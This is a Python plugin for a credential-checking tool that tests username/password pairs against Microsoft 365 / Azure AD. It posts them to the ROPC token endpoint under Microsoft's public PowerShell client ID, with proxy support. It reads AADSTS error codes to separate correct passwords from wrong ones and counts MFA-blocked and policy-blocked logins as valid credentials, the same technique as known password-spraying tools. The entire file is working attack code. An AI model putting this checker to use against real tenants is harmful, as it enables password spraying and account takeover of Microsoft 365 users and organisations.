"""Protocol-aware checker for Microsoft 365 / Azure AD.

Generic form-login checking doesn't work well against Microsoft's hosted
sign-in page (login.microsoftonline.com): it's a JS-heavy, frequently
changing SPA. But Azure AD also exposes the OAuth2 Resource Owner Password
Credentials (ROPC) grant on its token endpoint, and -- crucially for a
checker -- it replies with a machine-readable `AADSTS#####` error code that
distinguishes *why* a login failed: wrong password vs. no such user vs.
account locked vs. MFA required (which actually means the password was
correct). This is the same technique public tools like MSOLSpray/o365spray
use, and it's far more reliable than scraping HTML.

Note: MFA-required and Conditional-Access-blocked responses still mean the
password was CORRECT -- they're reported as success with a note, not a
failure, because from a "is this credential valid" standpoint, it is.
"""

from __future__ import annotations

import re
import time
from typing import Optional

from ..base import BaseChecker, LoginResult

try:
    import aiohttp
except ImportError:  # pragma: no cover - optional dependency
    aiohttp = None

TOKEN_ENDPOINT = "https://login.microsoftonline.com/{tenant}/oauth2/token"

# Microsoft's public, first-party "Microsoft Azure PowerShell" client ID.
# Using a well-known first-party client avoids AADSTS700016 (app not found in
# tenant) for tenants that haven't consented to a custom app registration.
DEFAULT_CLIENT_ID = "1b730954-1685-4b74-9bfd-dac224a7b894"
DEFAULT_RESOURCE = "https://graph.windows.net"

_AADSTS_RE = re.compile(r"AADSTS(\d+)")

# code -> (success, human label). success=True means the password itself
# was correct even though the overall sign-in didn't complete.
AADSTS_CODES = {
    "50034": (False, "User does not exist in this tenant"),
    "50126": (False, "Invalid username or password"),
    "50053": (False, "Account locked out (too many failed attempts)"),
    "50057": (False, "Account is disabled"),
    "50055": (True, "Valid credentials, but password has expired"),
    "50076": (True, "Valid credentials, MFA required"),
    "50079": (True, "Valid credentials, MFA enrollment required"),
    "53003": (True, "Valid credentials, blocked by Conditional Access policy"),
    "50158": (True, "Valid credentials, blocked by Conditional Access (claims challenge)"),
    "90072": (False, "Account exists in a different tenant (guest user redirect)"),
    "700016": (False, "Application/client_id not found in tenant (check config)"),
}


class Microsoft365Checker(BaseChecker):
    """AADSTS-aware checker for Microsoft 365 / Azure AD tenants (mode=o365)."""

    mode_name = "o365"

    def __init__(self, website_name, website_info):
        super().__init__(website_name, website_info)
        self.tenant = self._get("tenant", "common")
        self.client_id = self._get("client_id", DEFAULT_CLIENT_ID)
        self.resource = self._get("resource", DEFAULT_RESOURCE)
        self.timeout = self._get_float("timeout", 15.0)
        self.proxy = self._get("proxy") or None
        # Overridable so sovereign clouds (login.microsoftonline.us for Azure
        # Government, .partner.microsoftonline.cn for the China cloud) work
        # without a code change -- and so tests can point this at a local server.
        self.token_endpoint = self._get("token_endpoint") or TOKEN_ENDPOINT.format(tenant=self.tenant)
        self._session: Optional["aiohttp.ClientSession"] = None

    async def setup(self) -> None:
        if aiohttp is None:
            raise RuntimeError(
                "aiohttp is required for mode='o365'. Install it with:\n"
                "  pip install -r requirements.txt"
            )
        self._session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout))

    async def teardown(self) -> None:
        if self._session is not None:
            await self._session.close()
            self._session = None

    async def attempt(self, username: str, password: str) -> LoginResult:
        start = time.monotonic()
        url = self.token_endpoint
        payload = {
            "grant_type": "password",
            "client_id": self.client_id,
            "resource": self.resource,
            "username": username,
            "password": password,
            "scope": "openid",
        }
        try:
            async with self._session.post(url, data=payload, proxy=self.proxy) as response:
                body = await response.json(content_type=None)
        except Exception as exc:
            return LoginResult(
                username, password, False, f"Exception: {exc}",
                time.monotonic() - start, self.mode_name,
            )

        if "access_token" in body:
            return LoginResult(
                username, password, True, "Valid credentials (token issued)",
                time.monotonic() - start, self.mode_name, {"tenant": self.tenant},
            )

        error_description = body.get("error_description", "") or body.get("error", "Unknown error")
        match = _AADSTS_RE.search(error_description)
        code = None
        if match:
            code = match.group(1)
            success, label = AADSTS_CODES.get(code, (False, error_description.split("\r\n")[0]))
            reason = f"{label} (AADSTS{code})"
        else:
            success, reason = False, error_description.split("\r\n")[0] or "Unknown error"

        extra = {"tenant": self.tenant}
        if code == "50053":
            extra["locked_out"] = True

        return LoginResult(
            username, password, success, reason,
            time.monotonic() - start, self.mode_name, extra,
        )
